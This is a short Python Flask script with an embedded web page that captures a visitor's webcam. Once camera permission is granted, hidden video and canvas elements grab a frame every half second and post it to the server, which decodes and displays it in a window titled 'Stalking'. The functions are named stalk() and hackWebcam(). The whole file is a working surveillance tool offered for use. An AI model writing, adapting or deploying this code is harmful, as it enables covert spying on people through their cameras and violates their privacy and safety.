from flask import Flask
from flask import request
from flask import render_template_string
import base64
import cv2
import numpy as np
import threading

def update(frame):
  cv2.imshow("Stalking", frame)
  cv2.waitKey()

app = Flask(__name__)

@app.route('/stream', methods=['POST'])
def stalk():
  img_str = request.form.get('frame').split('data:image/png;base64,')[-1]
  img_byt = base64.b64decode(img_str)
  image = np.fromstring(img_byt, np.uint8)
  frame = cv2.imdecode(image, cv2.IMREAD_COLOR)
  x = threading.Thread(target=update, args=(frame,))
  x.start()
  return ''

@app.route('/')
def index():
  return render_template_string('''
    <h1 align="center">While you're reading this someone is spying on you via your webcam!</h1>
    <video hidden="true" id="video" playsinline autoplay></video>
    <canvas hidden="true" id="canvas" width="640" height="640">canvas</canvas>
    
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <script>
      function post(imgdata){
        $.ajax({
          type: 'POST',
          data: {frame: imgdata},
          url: '/stream',
          dataType: 'json',
          async: false
        });
      };

      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');

      const constraints = {
        audio: false,
        video: { facingMode: "user" }
      };

      async function hackWebcam() {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        window.stream = stream;
        video.srcObject = stream;

        var context = canvas.getContext('2d');
        
        setInterval(function() {
          context.drawImage(video, 0, 0, 640, 640);
          var canvasData = canvas.toDataURL("image/png")//.replace("image/png", "image/octet-stream");
          post(canvasData);
        }, 500);
      }

      hackWebcam();
    </script>
  ''')

if __name__ == '__main__':
  app.run(debug=True, threaded=True)
  